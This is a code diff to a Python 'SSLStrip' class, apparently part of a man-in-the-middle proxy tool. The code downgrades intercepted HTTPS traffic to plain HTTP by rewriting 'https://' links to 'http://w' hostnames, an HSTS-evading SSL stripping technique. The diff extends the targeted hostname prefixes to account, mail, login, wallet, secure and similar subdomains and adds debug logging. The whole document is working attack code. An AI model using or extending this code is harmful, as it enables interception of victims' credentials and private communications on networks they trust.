@@ -11,7 +11,7 @@ class SSLStrip:
             else:
                 req.path = "http://%s%s" % (req.headers['Host'], req.path)
         if req.headers:
-            prefixes = ["wwww", "wintra"]
+            prefixes = ["wwww","waccounts","wmail","wbooks","wssl","wdrive","wmaps","wnews","wplay","wplus","wencrypted","wassets","wgraph","wfonts","wlogin","wsecure","wwiki","wwallet","wmyaccount","wphotos","wdocs","wlh3","wapis","wb","ws","wbr","wna","wads","wlogin","wwm","wm","wmobile","wsb"]
             for p in prefixes:
                 for h in req.headers:
                     if p in req.headers[h]:
@@ -24,16 +24,19 @@ class SSLStrip:
                     res.headers[h].replace("https://","http://w")
         if res_body:
             if url.scheme == "http":
+                print("  not changing (http)")
                 return res_body
             else:
                 try:
                     hds = {}
                     hds['User-Agent'] = req.headers['User-Agent']
                     hds['Accept'] = req.headers['Accept']
-                    original_request = urllib2.Request("{}://{}{}".format(url.scheme, url.netloc, path),headers=hds)
+                    print("    https request to: {}://{}{}".format(url.scheme, url.netloc, path))
+                    original_request = urllib2.Request("{}://{}{}".format(url.scheme, url.netloc, path), headers=hds)
+
                     original_body = urllib2.urlopen(original_request).read()
                     res_body = original_body.replace("https://","http://w")
                 except Exception as e:
-                    print "Exception caught: {}".format(e)
-                    res_body = res_body.replace("https://","http://w")
+                    print ('Exception SSLSTRUP---> {}'.format(e))
+                    res_body = res_body.replace('https://', 'http://w')
             return res_body
